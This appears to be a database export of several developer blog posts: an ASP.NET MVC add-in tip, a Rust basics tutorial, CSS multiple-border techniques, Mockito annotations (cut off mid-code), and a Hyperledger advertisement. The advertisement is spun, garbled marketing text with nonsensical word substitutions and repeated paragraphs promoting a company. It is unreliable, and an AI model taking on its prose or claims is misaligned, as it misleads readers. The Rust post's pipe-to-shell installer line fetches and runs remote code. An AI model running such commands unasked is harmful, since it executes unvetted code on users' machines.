Add-In\n\t![alt](https://aspblogs.blob.core.windows.net/media/stephenwalther/WindowsLiveWriter/ASP.NET.NETMVCSpecificVisualStudioAddIns_8D9D/clip_image004_thumb.jpg)\n\nPhải thừa nhận rằng, rất nhiều dự án trong giai đoạn trẻ sơ khai. Đừng mong đợi một giao diện đột phá.\n\nTrước khi bạn có thể sử dụng TDD Class Generator Add-In, trước tiên bạn phải tạo Ứng dụng web C # ASP.NET MVC mới. Hãy chắc chắn rằng bạn tạo một dự án thử nghiệm. Ngoài ra, bạn cần reference cho cả NUnit và Rhino Mocks vào dự án thử nghiệm của mình.\n\nSau khi bạn tạo một dự án mới, bạn sử dụng TDD Class Generator Add-In bằng cách chọn tùy chọn menu ools, Generate Class Under Test. Ngoài ra, bạn chỉ có thể nhập tổ hợp bàn phím Ctrl-Alt-Enter. Phương thức khởi chạy Add-In sẽ hiển thị hộp thoại trong Hình 4.\n\nHình 3 - Sử dụng TDD Class Generator\n\t![alt](https://aspblogs.blob.core.windows.net/media/stephenwalther/WindowsLiveWriter/ASP.NET.NETMVCSpecificVisualStudioAddIns_8D9D/clip_image006_thumb.jpg)\n\nHình 4 – TDD Class Generator Dialog    \n    \t![alt](https://aspblogs.blob.core.windows.net/media/stephenwalther/WindowsLiveWriter/ASP.NET.NETMVCSpecificVisualStudioAddIns_8D9D/clip_image008_thumb.jpg)\n        \n        Chọn tên của dự án ứng dụng của bạn và tên của dự án thử nghiệm của bạn từ danh sách thả xuống. Nếu bạn hoàn hộp thoại bằng cách nhập giá trị mô hình cho vị trí thư mục và Movie cho tên lớp và nhấp vào Tạo nút (tốt, Generat nút trên máy tính của tôi) sau đó các tập tin sau đây được tạo ra trong dự án ứng dụng tự động:\n\n```\n\\Models\\Impl\\Movie.cs\n\n\\Models\\IMovie.cs\n```\n\nVà, tệp sau đây được tạo tự động trong dự án thử nghiệm:\n\n`\\Models\\MovieTester.cs`\n\nMục tiêu của tool là đưa bạn đi đúng hướng. Nó không chỉ tạo ra một lớp Movie . Thay vào đó, nó tạo ra một lớp Movie thực hiện một interface. Nó cũng giả định rằng bạn sẽ cần phải mock một lớp. Do đó,TDD Class Generator tự động thêm logic mô phỏng vào lớp MovieTester.cs.\n\nTôi nghĩ cách tiếp cận của Eric Hexter là một cách tiếp cận tuyệt vời để giúp xây dựng các ứng dụng ASP.NET MVC dễ dàng hơn. Ngay bây giờ, có rất nhiều tác vụ tạo tệp lặp đi lặp lại liên quan khi đưa ứng dụng ASP.NET MVC mới ra khỏi nền tảng (Đặc biệt nếu bạn muốn thực hiện mọi thứ đúng cách). Bằng cách xây dựng một thư viện các Add-Ins cụ thể của ASP.NET MVC, bạn có thể loại bỏ các tác vụ vô bổ, tẻ nhạt này.\n\nNguồn: https://weblogs.asp.net/stephenwalther/asp-net-mvc-tip-27-create-asp-net-mvc-specific-visual-studio-add-ins	Trong mẹo này, tôi thảo luận về TDD Class Generator Add-In của Eric Hexter cho Visual Studio. Add-In này cho phép bạn tạo một lớp, interface và lớp kiểm tra bằng cách nhập một phím tắt duy nhất.\nEric Hexter - người đã thực hiện công việc có giá trị trong dự án MvcContrib - đã đến thăm Microsoft vào tuần trước và cho tôi xem một trong những dự án hiện tại của anh ấy. Anh ấy đã bắt đầu một dự án ...	{https://aspblogs.blob.core.windows.net/media/stephenwalther/WindowsLiveWriter/ASP.NET.NETMVCSpecificVisualStudioAddIns_8D9D/clip_image002_thumb.jpg,https://aspblogs.blob.core.windows.net/media/stephenwalther/WindowsLiveWriter/ASP.NET.NETMVCSpecificVisualStudioAddIns_8D9D/clip_image004_thumb.jpg,https://aspblogs.blob.core.windows.net/media/stephenwalther/WindowsLiveWriter/ASP.NET.NETMVCSpecificVisualStudioAddIns_8D9D/clip_image006_thumb.jpg,https://aspblogs.blob.core.windows.net/media/stephenwalther/WindowsLiveWriter/ASP.NET.NETMVCSpecificVisualStudioAddIns_8D9D/clip_image008_thumb.jpg}	1	ASP.NET MVC Tip #27 – Tạo ASP.NET MVC Specific Visual Studio Add-Ins	{csharp,aspnet}	0	f	2022-12-18 15:33:38.039+00	2022-12-18 15:33:38.039+00
31995	![title](https://images.viblo.asia/f70ea291-8155-4ba3-9515-93bdcfe269fd.png)\n\nRust is a relatively new system programming language.\nThis article will attempt to cover some of the basic features of Rust that are common to languages of identical paradigms.\n\n### A "hello world"\n\nA Rust `hello world` can be as simple as,\n\n```rust\nfn main() {\n  println!("Hello world");\n}\n```\n\nLike many other languages that use `def` or `function`, Rust uses `fn` to indicate a function definition.\nThe function name follows `fn`, then empty parenthesis pair `()` indicates that the function doesn't accept any argument.\nThe region enclosed by brace pair `{}` is function body, as usual.\nBut, probably you noticed something weird in the line `println!("Hello world");`, there's an exclamation sign (`!`) following by the function name.\nThis is one of Rust's many unique features, and interestingly this is a macro rather than a function.\n\n### Fire it up\n\nIn order to work with Rust in our local machine, we need Rust installed. This can be achieved by running a ready made script,\n```bash\ncurl https://sh.rustup.rs -sSf | sh\n```\nAlthough this is a one time step you will have to take, but if you're not feeling like investing that time, then you may use the online editor available [here](https://play.rust-lang.org/).\n\nRemember, Rust is a compiled language, so we have to face the same painful process of compilation before running the code. Let's do that.\nFirst, create a project directory and `cd` into it.\n```bash\n$ mkdir rusty\n$ cd rusty\n```\nNow create a source File with `rs` extension (all the rust sources have any of `rs`, `rlib`, `rafto` extension),\n```bash\ntouch main.rs\n```\nand insert our little *hello world* program in it. Save it.\nAnd, now the part we are waiting for. Let's compile it.\n```bash\nrustc main.rs\n```\n`rustc` is the rust compiler which, as usual, generates an executable (with the same name as the source, but excluding any extension).\nNow run the executable\n```bash\n./main\n```\n\n### Basics\n\nRust is like a king in it's own domain. There are too much Rust specific unique features that are to be honest, overwhelming.\nSo, let's discuss the basic features we are generally used to and has wide cross language availability.\n\n#### Variable\n\nVariables are interesting in Rust. Let's see it through.\nA variable can be declared like this,\n```rust\nlet x = 777;\n```\nBut, don't be deceived by it's naive look. If you try something like this,\n```rust\nlet x = 777;\nx = 44;\n```\nthis will fail. And, that is because variable bindings are immutable by default. In order to define a mutable variable binding we will some something like\n```rust\nlet mut x = 777;\n```\nSince, it's a statically typed language, you may be wondering, shouldn't I declare a data type?\nRust can infer data types and so far we are using the inference feature of Rust. Now, let's define the same variable but, this time, like C/C++ we'll explicitly mention the type.\n```rust\nlet x: i32 = 777;\n```\nHere we declared x as an immutable 32-bit integer. Now let's have a quick peek to some basic (primitive) types that we may use,\nSigned integer: `i8`, `i16`, `i32`, `i64`\nUnsigned integer: `u8`, `u16`, `u32`, `u64`\nFloat: `f32`, `f64`\nBoolean: `bool`\nCharacter: `char`\n\nAn important thing to note here, `char` is by default, four bytes.\n\nRust has it's referencing mechanism that can be used like,\n```rust\nlet x = 777;\nlet y = &x;\n```\nThe `&` here implying that y is indicating to the reference of x. It's more complicated than it appears here.\nIn order to explain it all we'll have to cover several Rust specific concepts like *Ownership*, *Borrowing* and *Lifetime*.\nWe are safe leaving those concepts untouched as long as we are not modifying the referenced variable. So, let's skip it for now.\n\nLet's get familiar with another type which handles sequential data. Yeah, I'm talking about array.\nAn array declaration is made like this,\n```rust\nlet x = [666, 777, 888];\n```\nWhere some basic operations like selection by index and slicing is performed by doing this,\n```rust\nlet x = [666, 777, 888];\n\n// Selection by index\nx[1]  // returns second entry\n\n// Slicing\nlet y = &x[..]; // Returns the entire array\n```\nThe new operator here `..` is to indicate range. We could write,\n```rust\nlet y = &x[2..];\n```\nwhich would have returned an array with only the last element of x in it.\n\n#### Code units\nRust's coding units are functions. Functions have following structure.\n```rust\nfn function_name(arg1, arg2, ...) -> return_type {\n\n}\n```\nInteresting, isn't it?\nLet's take a look at a function that takes an integer and returns it's square\n```rust\nfn square(x: i32) -> i32 {\n  x*x\n}\n```\nHow about some string?\n```rust\nfn print_merged_str(x: &str, y: &str) {\n  println!("{}{}", x, y);\n}\n```\nDid you notice something? In our string example, there is no return type specified. This, is a default. Functions that doesn't return any value doesn't need the return section. Only exceptions are divergents, but they are whole different things. :)\n\n#### Flow control\nRust got it's own version of `if`.\n```rust\nif expression {\n  // ...\n} else if expression {\n\n} else {\n  // ...\n}\n```\nThe only distinguishable thing here from a `C` `if`, is that, it has got not parenthesis to enclose the switching expression.\nThere is no other significant differences.\n\n#### Iteration\nIt has the basic `while`,\n```rust\nwhile expression {\n  // ...\n}\n```\nand a wonderful `for`, which is very much like the python's `in`.\n```rust\nfor iterated_value in expression {\n  // ...\n}\n```\nThere is also an infinite looping support through\n```rust\nloop {\n  // ..\n}\n```\nwhich eliminates the need for modifying `while` or `for` to achieve this.\n\nA premature escape can be performed through a `break` statement. I guess you already presumed the existence of a `continue` statement? Yeah, it exists and functions as expected. Additionally, Rust supports loop labeling that can be used with `while` or `for` to achieve controlled loop escaping. For details, see [[#link](https://doc.rust-lang.org/book/loops.html#loop-labels)]\n\n#### Lambda\n\nIn Rust, lambda's are called *Closures*.\nA *closure* can be defined as follows,\n```rust\nlet x = |p: i32| p*p;\n```\nHere, x is the variable binding. The region enclosed by vertical bars contains arguments, the region succeeded by the vertical bars is the lambda definition.\nIt is quite easy, isn't it? :)\n\n### Modularization\n\n![modularization](https://images.viblo.asia/26721b58-2647-438b-af2b-bee4449b3b52.png)\n\nSo far we worked on a single file source, and didn't use any libraries, but nearly all of the projects will require many dependency libraries. Also, when the project will get bigger, a single file based model will soon become unrealistic. Let's deal with these issues.\n\n#### Dependency management\n\nRust provides a tool named `cargo` that deals with the dependency. All the libraries are called `crate`s.\nLet's build a cargo enabled binary project (project that can be utilized as an executable).\n```bash\ncargo new rusty --bin\n```\nThis creates a project folder structure where `rusty` is the root folder. Let's explore inside,\n```text\n  rusty\n  ├── Cargo.toml\n  └── src\n      └── main.rs\n```\nCargo.toml is the configuration file that `cargo` uses during dependency management and compilation operations.\nIf we need to add a dependency, we'll append the `crate`name and it's associated semantic versioning that we want to use in the `[dependencies]` section of Cargo.toml like this,\n```ini\n...\n\n[dependencies]\npackage_name = "1.0.0"\n```\n\n#### Crate generation\nCrate building is very much identical to binary project generation that we mentioned in the previous section. In order to build a `crate` skeleton,\n```bash\ncargo new rusty_crate\n```\nThis will generate,\n```text\n  rusty_crate\n  ├── Cargo.toml\n  └── src\n      └── lib.rs\n```\nThe only difference in a crate is that it doesn't have a `fn main()` entry point.\n\nIn order to utilize a crate, in the consumer rust source file, we'll prepend the following line\n```rust\nextern crate crate_name;\n```\nThen we can utilize the crate contents (with the consideration that, it contains a `square` function) as follows,\n```rust\nprintln!("Square of four: {}", crate_name::square(4));\n```\nOr, we could import the function names into our consumer source's scope by utilizing `use` like this,\n```rust\nextern crate rusty;\n\nuse rusty::square;\n\nprintln!("Square of four: {}", square(4));\n```\nLet's consider another scenario, where `rusty` crate has a submodule `math`, which contains `square` function. We could handle this scenario like this,\n```rust\nextern crate rusty;\n\nuse rusty::math::square;\n\nprintln!("Square of four: {}", square(4));\n```\n\n### Performance\nRust performance is very much identical to the performance of C. In some cases it outperforms `C` and in some other cases it's slower than C. But this should not be considered a bad thing, since Rust is relatively very new and the issues are getting resolved fast and the community is pretty strong.\n\nA tour to the github repository for Rust compiler and standard libraries show that, there's about ~450 issues tagged for it's slow performance, where about ~350 issues are already closed [[#link](https://github.com/rust-lang/rust/labels/I-slow)]. The issue reporting and resolving frequency suggests that, we can expect an exactly equivalent performance to C very soon.\n\n### Cross platform support\n\nRust is supported across most of the major platforms. The platform wise support in Rust is divided into three different tiers. A tier indicates the *support*, *reliability* and *build and execution guarantee*.\n\n***Tier 1*** can be summarized as fully supported platforms.\n\n***Tier 2*** platform codes will build reliably but test are not always available.\n\n***Tier 3*** platform support is mostly unofficial and reliability is a big concern here.\n\n### Usage\n\nSince Rust is a system programming language, not to mention, it is used mostly in cases where critical performance is required, like *embedded applications*, *game engine development*, *sophisticated algorithm implementation* and many more.\nOrganizations like Mozilla, Dropbox, Samsung, Skylight are contributing and/or consuming Rust in their products. A good example could be Mozilla's Servo browser engine. Rust has over 1200 contributors. Pretty strong, nah?\n\n### Possibilities\n\nMany considers Rust as a modern alternative to C. While it is still lacking behind in terms of performance, but the margins are expected to converge soon enough.\n\n### References\n\n- https://www.rust-lang.org/learn	\n\nRust is a relatively new system programming language.\nThis article will attempt to cover some of the basic features of Rust that are common to languages of identical paradigms.\n\nA "hello world"\n\nA Rust hello world can be as simple as,\n\nLike many other languages that use def or function, Rust uses fn to indicate a function definition.\nThe function name follows fn, then empty parenthesis pair (...	{https://images.viblo.asia/f70ea291-8155-4ba3-9515-93bdcfe269fd.png,https://images.viblo.asia/26721b58-2647-438b-af2b-bee4449b3b52.png}	1	Rust - Getting Rusty!	{rust,intro}	0	f	2022-12-18 15:33:38.057+00	2022-12-18 15:33:38.057+00
31989	![](https://images.viblo.asia/be59d0af-07f6-4ab1-9c9b-a9dabd310a8a.png)\nHyperledger is known as the venture-class distributed ledger which utilizes blockchain technology by using smart contracts Develop Retail, Financial, Health Care, etc. private blockchains.  It is hosted through universal collaboration and  Linux Foundation and a  which involves, supply chain, finance, banking, internet of things (IoT), etc. at the one place.\nTokyoTechie.Com  is one of the best leading a Hyperledger Development Company in Australia will support you to develop decentralized enterprise applications utilizing Hyperledger.\n \nThe Hyperledger provides the foundations for identity, privacy, and process. it's best used in capital markets wherever there's an oversized volume of transactions through chain-code execution.  The other necessary factor behind its implementation is to satisfy the necessity for knowledge privacy with the avenues.\nApart from this, Hyperledger will minimize the price and involvement of needless things within the world to boost leads to the business. the most expression behind it's to support open protocols worldwide.\n\n As of these days, prime IT firms square measure providing the Hyperledger blockchain development services to bring transparency and answerableness to their organization so they'll build extremely advanced and secured applications. \n\nHyperledger blockchain technology provides some crucial options like network platform, higher accuracy, reliable business model, etc. once it involves choosing a Hyperledger application for your business development, TokyoTechie.Com Technologies is that the right selection as we tend to use most gifted developers UN agency square measure specialists within the field of Blockchain Technology. The Hyperledger provides the foundations for identity, privacy, and process. it's best used in capital markets wherever there's an oversized volume of transactions through chain-code execution.  The other necessary factor behind its implementation is to satisfy the necessity for knowledge privacy with the avenues.\nApart from this, Hyperledger will minimize the price and involvement of needless things within the world to boost leads to the business. the most expression behind it's to support open protocols worldwide.\n\n As of these days, prime IT firms square measure providing the [Hyperledger blockchain development services in Australia](https://tokyotechie.com/hyperledger-fabric-development-company/)  to bring transparency and answerableness to their organization so they'll build extremely advanced and secured applications. \nHyperledger blockchain technology provides some crucial options like network platform, higher accuracy, reliable business model, etc.\n once it involves choosing a Hyperledger application for your business development, TokyoTechie.Com Technologies is that the right selection as we tend to use most gifted developers UN agency square measure specialists within the field of Blockchain Technology.\n\nWhy Create Hyperledger?\nNowadays Blockchain technology is the most advanced technology. The blockchain significantly let the companies attach to any or all department and levels of the corporate. because of these reasons, it appears like a natural development in business systems whose purpose is cooperative operating. making Hyperledger provides numerous benefits as follows:\n\nUniformly distributed ledger\nNeed-to-know basis data\nPerformance and Scalability\nPermission membership\nProtection of digital keys\nSecurity of sensitive information\nPlug-in Component-based design\nSo all those Agency who need to manage all the data, then Hyperledger Blockchain development for sure play an important role in it. A peer to look appointed record system, the Hyperledger is made via agreement and helpful technologies that promise to convert successive generation of business applications.\n\nWhy Choose Us?\nWhen you attempt to select the Hyperledger app for the event of your business, then the team at TokyoTechie.Com -Blockchain Development Company In Australia. within the field of Blockchain technology, our team is packed with talent that shows you what innovation you'll be able to liquidate your business with our system. The dedicated, skilled and accountable team at TokyoTechie.Com ne'er allow you to down relating to your wants. we tend to area unit here standing next to you to satisfy all of your has to bring home the bacon your target. Contact us and realize however we will assist you.	![](https://images.viblo.asia/be59d0af-07f6-4ab1-9c9b-a9dabd310a8a.png)\n\n\nHyperledger is known as the venture-class distributed ledger which utilizes blockchain technology by using smart contracts Develop Retail, Financial, Health Care, etc. private blockchains.  It is hosted through universal collaboration and  Linux Foundation and a  which involves, supply chain, finance, banking, internet of things (IoT), etc. at the one place.\nTokyoTechie.Com  is one of the best...	{https://images.viblo.asia/be59d0af-07f6-4ab1-9c9b-a9dabd310a8a.png}	1	The Ultimate Guide To Hyperledger Fabric Development Company in Australia	{blockchain,hyperledger-fabric-application-development,hyperledger-development-company}	0	f	2022-12-18 15:33:38.097+00	2022-12-18 15:33:38.097+00
31979	Chào các bạn!\n\nĐã bao giờ các bạn phải tạo 1 box mà có nhiều border chưa? Thực ra vấn đề này không khó. Bạn có thể dùng phương pháp truyền thống đó là tạo nhiều element con bên trong rồi thêm border cho các element đó. Như vậy có nghĩa là 1 box có bao nhiều border thì cần tạo bấy nhiều element con. Phương pháp này không sai tuy nhiên nó hơi lạm dụng việc tạo element con. Tốn dung lượng, tốn bộ nhớ và có khi làm ảnh hưởng tới performance. \n\nCó 1 cách cực kỳ đơn giản mà bạn chỉ cần 1 sử dụng duy nhất 1 element nhưng vẫn có thể tạo ra nhiều border cho element đó. Tạo như thế nào thì hiện tại cùng mình đi vào chi tiết nhé.\n\n## 1. Sử dụng pseudo element(s)\n\n*Ở đây không biết có bạn nào còn chưa hiểu về khái niệm pseudo element hoặc pseudo class không? Nếu chưa hiểu thì hãy comment bên dưới để bài sau mình viết bài về 2 khái niệm này nhé. Trước tiên, tạm bỏ qua khái niệm và cùng đi vào cách sử dụng nó coi sao.*\n\nCác bạn có thể sử dụng pseudo element **:before** hoặc **:after** của element đó, tạo border cho 2 pseudo element này sao cho chúng lớn hơn để bao ngoài hoặc nhỏ hơn để nằm bên trong element. Tất nhiên phải bảo đảm được nội dung phải luôn được ưu tiên hiển thị ở trên cùng.\n\nỞ đây mình lấy ví dụ đơn giản như thế này.\n\n```\n.module {\n  width: 200px;\n  height: 200px;\n  background: #f06d06;\n  position: relative;\n  border: 5px solid blue;  \n  margin: 20px;\n}\n```\n\nElement này tạm thời đang có bordder màu **blue** và được gán **position: relative**.  Bây giờ mình sẽ sử dụng pseudo element **:after** để tạo thêm 1 border bao ngoài element **.module** này.\n\n```\n.module:after {\n  content: '';\n  position: absolute;\n  top: -15px;\n  left: -15px;\n  right: -15px;\n  bottom: -15px;\n  background: red;\n  z-index: -1;\n}\n```\n\nỞ đây mình đã set  **position: absolute** cho pseudo element **:after**. Điều kiện đầu tiên để hiển thị được :after này bắt buộc phải có thuộc tính **content: ''**. Cùng với đó, bạn có thể set các thuộc tính về vị trí top/left/bottom/right cho nó. Như vậy là đã tạo được border cho phần :after. Tuy nhiên, làm sao để cho phần :after này luôn nằm dưới phần content của element thì phải sử dụng thuộc tính z-index bằng cách cho z-index giá trị âm.\n\nKết quả hiển thị như sau:\n\n{@embed: https://codepen.io/chriscoyier/pen/gbgRqZ}\n\nNhư vậy là element của bạn đang có 2 border: blue bên trong và red bên ngoài. Tất nhiên, bạn cũng có thể làm tương tự với pseudo element **:before**\n\nLưu ý 1 điều: ở trên Firefox 3 (3.6 trở về trước) vẫn hỗ trợ :after và :before. Tuy nhiên lại không cho phép áp dụng thuộc tính position: absolute lên chúng. Vậy nên khi áp dụng cách này bạn cần cân nhắc kỹ.\n\n## 2. Sử dụng Outline\n\nChắc các bạn cũng không lạ gì với thuộc tính **outline** này nữa rồi nhỉ. Thuộc tính này nó hơi khác 1 chút so với thuộc tính **border**.\nNếu như **border** có thể dùng theo từng cạnh hoặc 2 cạnh hoặc 3 cạnh hoặc toàn bộ thì outline chỉ có thể sử dụng 1 cách duy nhất đó là toàn bộ 4 mặt của 1 element. Vì vậy, cách này chỉ sử dụng được khi element của các bạn cần hiển thị ở cả 4 phía nhé.\n\n```\n.borders{\n  border: 5px solid blue; \n  outline: 5px solid red;\n  width: 200px;\n  height: 200px;\n  background: pink;\n  position: relative;\n}\n```\n\nHãy copy đoạn css trên để hiện thị demo nhé. Tất nhiên, nhớ tạo 1 element có class **.borders**  đó.\n\n## 3. Sử dụng box-shadow\n\nĐây cũng là 1 cách khá thông dụng. Sử dụng box-shadow bằng cách như sau:  tạo shadow off và có blur là 0. Ngoài ra, hãy phân tách các giá trị bằng dấu phẩy ",", bạn sẽ có nhiều borders như mong muốn.\n\n```\n.module {\n  width: 200px;\n  height: 200px;\n  background: #f06d06;\n  position: relative;\n  margin: 20px;\n  box-shadow: \n    0 0 0 10px hsl(0, 0%, 50%),\n    0 0 0 15px hsl(0, 0%, 60%),\n    0 0 0 20px hsl(0, 0%, 70%),\n    0 0 0 25px hsl(0, 0%, 80%),\n    0 0 0 30px hsl(0, 0%, 90%);\n}\n```\n\n{@embed: https://codepen.io/chriscoyier/pen/xbgreX}\n\n## 4. Sử dụng clipped background\n\nBằng cách sử dụng padding cho element, sau đó sử dụng thuộc tính **background-clip: content-box;** là border bình thường của element trông giống như có 2 borders vậy.\n\n```\ninput {\n  border: solid 1px #f06d06;\n  padding: 5px;\n  height: 1.5em; // because IE\n  border-radius: 4px; // support: IE9+ ;)\n  background-clip: content-box; // support: IE9+\n  background-color: white;\n  line-height: 1.5;\n  font-size: 20px;\n  text-indent: 0.5rem;\n}\n```\n\n{@embed: https://codepen.io/chriscoyier/pen/zxNzQw}\n\nDemo sử dụng input nhưng bạn hoàn toàn có thể sử dụng cho div như bình thường nhé.\n\n## 5. Sử dụng giá trị double của border\n\nKhi sử dụng border-style, ngoài các giá trị như solid, dotted, dash thì còn 1 giá trị có thể khiến border double lên. Đó chính là **border-style: double**\n\n```\n.module {\n  width: 200px;\n  height: 200px;\n  background: #f06d06;\n  position: relative;\n  margin: 20px;\n  border: 4px double blue;\n}\n```\n\nĐể hiển thị được 2 border khi sử dụng **border-style: double** thì cái **border-width** phải có giá trị min = 4. Như vậy mới hiển thị rõ ràng được. Không tin các bạn có thể copy đoạn code css trên và thay đổi các giá trị xem sao nhé.\n\nNhư vậy, bài này mình đã giới thiệu cho các bạn một số cách tạo multiple borders cho 1 element. Hi vọng bài viết này giúp ích cho các bạn được ít nhiều. \n\nLink tham khảo\nhttps://css-tricks.com/snippets/css/multiple-borders/	Chào các bạn!\n\nĐã bao giờ các bạn phải tạo 1 box mà có nhiều border chưa? Thực ra vấn đề này không khó. Bạn có thể dùng phương pháp truyền thống đó là tạo nhiều element con bên trong rồi thêm border cho các element đó. Như vậy có nghĩa là 1 box có bao nhiều border thì cần tạo bấy nhiều element con. Phương pháp này không sai tuy nhiên nó hơi lạm dụng việc tạo element con. Tốn dung lượng, tốn bộ ...	{}	1	Bài 33 - Tạo multiple borders cho 1 element	{front-end,css3,html5}	0	f	2022-12-18 15:33:38.116+00	2022-12-18 15:33:38.116+00
31940	# 1. Overview\nNếu bạn từng dùng Mockito để unit testing trong Android nhưng còn chưa hiểu rõ về các annotation của nó thì bài viết này dành cho bạn rồi.\nTrong bài viết này mình sẽ trình bày về những annotations của thư viện Mockito : *&#64;Mock, &#64;Spy, &#64;Captor, và &#64;InjectMocks.*\n# 2. Enable Mockito Annotations\nTrước tiên - hãy xem cách cho phép sử dụng annotation với Mockito tests.\nĐể cho phép sử dụng những Annotation này, chúng ta cần chú thích test JUnit với một Runner - MockitoJUnitRunner như trong ví dụ sau:\n```java\n@RunWith(MockitoJUnitRunner.class)\npublic class MockitoAnnotationTest {\n    ...\n}\n```\nNgoài ra, chúng ta cũng có thể kích hoạt các chú thích này theo cách khác, bằng cách gọi MockitoAnnotations.initMocks () như trong ví dụ sau:\n```java\n@Before\npublic void init() {\n    MockitoAnnotations.initMocks(this);\n}\n```\n# 3. &#64;Mock Annotation\nChú thích được sử dụng rộng rãi nhất trong Mockito là &#64;Mock. Chúng ta có thể sử dụng &#64;Mock để tạo và inject (tiêm) các trường hợp giả mà không cần phải gọi Mockito.mock theo cách thủ công.\n\nTrong ví dụ sau - chúng ta sẽ tạo một ArrayList giả định theo cách thủ công mà không cần sử dụng chú thích @Mock.\n```java\n@Test\npublic void whenNotUseMockAnnotation_thenCorrect() {\n    List mockList = Mockito.mock(ArrayList.class);\n     \n    mockList.add("one");\n    Mockito.verify(mockList).add("one");\n    assertEquals(0, mockList.size());\n \n    Mockito.when(mockList.size()).thenReturn(100);\n    assertEquals(100, mockList.size());\n}\n```\nVà bây giờ chúng ta sẽ làm tương tự nhưng chúng ta sẽ inject các giả định bằng cách sử dụng chú thích @Mock:\n```java\n@Mock\nList<String> mockedList;\n \n@Test\npublic void whenUseMockAnnotation_thenMockIsInjected() {\n    mockedList.add("one");\n    Mockito.verify(mockedList).add("one");\n    assertEquals(0, mockedList.size());\n \n    Mockito.when(mockedList.size()).thenReturn(100);\n    assertEquals(100, mockedList.size());\n}\n```\nTrong hai ví dụ trên chúng ta đều đang tương tác với các giả định (mock) và xác minh bằng Mockito.verify chỉ để chắc chắn rằng nó hoạt động chính xác.\n> Mock object (MO) là một đối tượng ảo mô phỏng các tính chất và hành vi giống hệt như đối tượng thực được truyền vào bên trong khối mã đang vận hành nhằm kiểm tra tính đúng đắn của các hoạt động bên trong.\n> \n# 4. &#64;Spy Annotation\nBây giờ - hãy xem cách sử dụng chú thích @Spy để theo dõi một trường hợp hiện có.\nTrong ví dụ sau - chúng ta tạo một spy của List theo cách cũ mà không sử dụng chú thích @Spy:\n```java\n@Test\npublic void whenNotUseSpyAnnotation_thenCorrect() {\n    List<String> spyList = Mockito.spy(new ArrayList<String>());\n     \n    spyList.add("one");\n    spyList.add("two");\n \n    Mockito.verify(spyList).add("one");\n    Mockito.verify(spyList).add("two");\n \n    assertEquals(2, spyList.size());\n \n    Mockito.doReturn(100).when(spyList).size();\n    assertEquals(100, spyList.size());\n}\n```\nBây giờ chúng ta hãy làm tương tự - spy trong List - nhưng làm như vậy bằng cách sử dụng chú thích @Spy:\n```java\n@Spy\nList<String> spiedList = new ArrayList<String>();\n \n@Test\npublic void whenUseSpyAnnotation_thenSpyIsInjected() {\n    spiedList.add("one");\n    spiedList.add("two");\n \n    Mockito.verify(spiedList).add("one");\n    Mockito.verify(spiedList).add("two");\n \n    assertEquals(2, spiedList.size());\n \n    Mockito.doReturn(100).when(spiedList).size();\n    assertEquals(100, spiedList.size());\n}\n```\nLưu ý , như trước đây - chúng ta đang tương tác với spy ở đây để đảm bảo rằng nó hoạt động chính xác. Trong ví dụ này, chúng ta:\n* Đã sử dụng **real method** spiedList.add () để thêm các phần tử vào spiedList. \n* Stubbed phương thức spiedList.size () để trả về 100 thay vì 2 bằng Mockito.doReturn (ức\n\n> Đối tượng spy là đối tượng bán ảo, hay nói cách khác nó vừa là đối tượng thực, vừa là đối tượng ảo. Vừa là đối tượng thực vì nó hoàn toàn có thể thực hiện các method của một đối tượng thực một cách chính xác, không cần stub trước giá trị để trả về như đối tượng mock. Vừa là đối tượng ảo vì nó có thể thực hiện các câu lệnh của một đối tượng mock.\n\n# 5. &#64;Captor Annotation\nTiếp theo - hãy xem cách sử dụng chú thích @Captor để tạo một instance ArgumentCaptor.\n\nTrong ví dụ sau - chúng ta tạo một ArgumentCaptor theo cách cũ mà không sử dụng chú thích @Captor:\n```java \n@Test\npublic void whenNotUseCaptorAnnotation_thenCorrect() {\n    List mockList = Mockito.mock(List.class);\n    ArgumentCaptor<String> arg = ArgumentCaptor.forClass(String.class);\n \n    mockList.add("one");\n    Mockito.verify(mockList).add(arg.capture());\n \n    assertEquals("one", arg.getValue());\n}\n```\nBây giờ chúng ta hãy sử dụng @Captor cho cùng một mục đích - để tạo một instance ArgumentCaptor:\n```java\n@Mock\nList mockedList;\n \n@Captor\nArgumentCaptor argCaptor;\n \n@Test\npublic void whenUseCaptorAnnotation_thenTheSam() {\n    mockedList.add("one");\n    Mockito.verify(mockedList).add(argCaptor.capture());\n \n    assertEquals("one", argCaptor.getValue());\n```\n# 6. &#64;InjectMocks Annotation\nBây giờ - hãy thảo luận về cách sử dụng chú thích @InjectMocks - để tự động đưa các trường giả vào đối tượng được kiểm tra.\n\nTrong ví dụ sau - chúng ta sử dụng @InjectMocks để đưa  wordMap vào MyDipedia dic :\n```java\n@Mock\nMap<String, String> wordMap;\n \n@InjectMocks\nMyDictionary dic = new MyDictionary();\n \n@Test\npublic void whenUseInjectMocksAnnotation_thenCorrect() {\n    Mockito.when(wordMap.get("aWord")).thenReturn("aMeaning");\n \n    assertEquals("aMeaning", dic.getMeaning("aWord"));\n}\n```\nVà đây là lớp MyDictionary:\n```java \npublic class MyDictionary {\n    Map<String, String> wordMap;\n \n    public MyDictionary() {\n        wordMap = new HashMap<String, String>();\n    }\n    public void add(final String word, final String meaning) {\n        wordMap.put(word, meaning);\n    }\n    public String getMeaning(final String word) {\n        return wordMap.get(word);\n    }\n}\n```\n# 7. Injecting a Mock into a Spy\nTương tự như thử nghiệm trên, chúng ta có thể muốn inject mock vào một spy:\n```java \n@Mock\nMap<String, String> wordMap;\n \n@Spy\nMyDictionary spyDic = new MyDictionary();\n```\nTuy nhiên, Mockito không hỗ trợ inject mock vào một spy và các test sau ném ra một exeption:\n```java \n@Test\npublic void whenUseSpyWhichNeedsTheMock_thenCorrect() { \n    Mockito.when(wordMap.get("aWord")).thenReturn("aMeaning"); \n \n    assertEquals("aMeaning", spyDic.getMeaning("aWord")); \n}\n```\nNếu chúng ta muốn sử dụng một mock với một spy, chúng ta có thể inject mock thông qua một constructor :\n```java\nMyDictionary(Map<String, String> wordMap) {\n    this.wordMap = wordMap;\n}\n```\nThay vì sử dụng chú thích, giờ đây chúng ta có thể tạo spy theo cách thủ công: \n```java\n@Mock\nMap<String, String> wordMap; \n \nMyDictionary spyDic;\n \n@Before\npublic void init() {\n    MockitoAnnotations.initMocks(this);\n    spyDic = Mockito.spy(new MyDictionary(wordMap));\n}\n```\nTest trên giờ đã pass.\n# 8. Running into NPE while using annotation\nThông thường, chúng ta có thể run into NullPointerException khi chúng ta cố gắng thực sự sử dụng instance được chú thích bằng &#64;Mock hoặc &#64;Spy, như trong ví dụ: \n```java\npublic class NPETest {\n \n    @Mock\n    List mockedList;\n \n    @Test\n    public void test() {\n        